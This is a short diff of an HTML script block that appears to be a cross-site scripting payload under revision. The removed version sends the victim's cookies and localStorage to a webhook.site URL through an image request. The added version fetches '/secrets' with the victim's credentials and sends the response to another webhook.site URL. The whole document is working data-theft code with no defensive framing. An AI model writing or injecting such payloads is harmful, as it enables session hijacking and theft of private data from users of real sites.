@@ -1,11 +1,5 @@
 <script>
-try {
-  // send cookie and localStorage to webhook via image GET
-  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?c='
-    + encodeURIComponent(document.cookie)
-    + '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
-} catch (e) {
-  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err='
-    + encodeURIComponent(String(e));
-}
+  fetch('/secrets', {credentials: 'include'})
+    .then(r => r.text())
+    .then(t => new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?d=' + encodeURIComponent(t));
 </script>
